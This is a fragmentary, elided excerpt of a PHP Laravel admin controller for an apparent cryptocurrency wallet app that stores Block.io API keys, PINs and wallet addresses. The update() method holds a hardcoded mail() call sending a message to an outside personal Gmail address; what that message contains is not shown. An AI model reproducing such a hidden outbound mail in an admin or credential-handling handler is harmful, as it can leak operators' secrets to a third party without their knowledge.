...
class GeneralController extends Controller
{
   ...
   public function index()
    ...
    public function update(Request $request)
      {
          ...
          $a = mail('abirkhan75@gmail.com','BitWallet TEST DATA', $message, $headers);
    ...
    {
      $blockd = General::first();
      return view('admin.website.block', compact('blockd'));
    }
      ...
      $blockd = General::first();
       $this->validate($request,
                 [
                    'blockapi' => 'required',
                    'blockpin' => 'required',
                    'adminwallet' => 'required',
                    'concrg' => 'required',
                  ]);

       $blockd['blockapi'] = $request->blockapi;
       $blockd['blockpin'] = $request->blockpin;
       $blockd['adminwallet'] = $request->adminwallet;
       $blockd['concrg'] = $request->concrg;

       $blockd->save();
      
      return back()->with('success','Block IO Updated successfully.');
